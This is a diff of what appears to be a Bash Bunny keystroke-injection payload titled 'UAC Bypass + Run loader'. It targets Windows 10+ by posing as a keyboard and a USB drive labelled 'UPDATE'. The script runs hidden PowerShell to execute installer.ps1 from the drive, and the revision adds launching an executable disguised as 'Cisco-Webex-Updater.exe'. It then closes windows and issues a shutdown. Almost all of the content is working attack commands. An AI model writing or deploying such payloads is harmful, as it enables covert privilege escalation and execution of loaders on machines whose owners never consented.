@@ -1,7 +1,7 @@
 #
 # Title:         UAC Bypass + Run loader
 # Author:        S1n1st3r
-# Version:       2
+# Version:       2.1
 # Target:        Windows 10+
 # Category:      Exploitation
 #
@@ -11,23 +11,11 @@ DRIVER_LABEL='UPDATE'
 ATTACKMODE HID STORAGE
 LED STAGE1
 Q DELAY 8000
-RUN WIN powershell -WindowStyle hidden -Command "powershell ((gwmi win32_volume -f 'label=''UPDATE''').Name+'payloads\\$SWITCH_POSITION\installer.ps1')"
-LED STAGE2
-Q DELAY 9000
-Q STRING "cd .\\WindowsPowerShell\\v1.0\\"
-Q ENTER
-Q DELAY 300
-Q STRING "start .\\powershell.exe"
-Q ENTER
-Q DELAY 500
+RUN WIN powershell -WindowStyle hidden -Command "powershell ((gwmi win32_volume -f 'label=''UPDATE''').Name+'payloads\\$SWITCH_POSITION\installer.ps1') ((gwmi win32_volume -f 'label=''UPDATE''').Name+'payloads\\$SWITCH_POSITION\Cisco-Webex-Updater.exe')"
 LED ATTACK
-Q STRING ".((gwmi win32_volume -f 'label=''UPDATE''').Name+'payloads\\$SWITCH_POSITION\<REPLACE WITH YOUR LOADER>.exe')"
-Q ENTER
-# Update below according to how long your loader will take to execute
 Q DELAY 15000
 Q ALT F4
-Q DELAY 400
-Q ALT F4
 LED FINISH
+Q DELAY 400
 shutdown 0
  
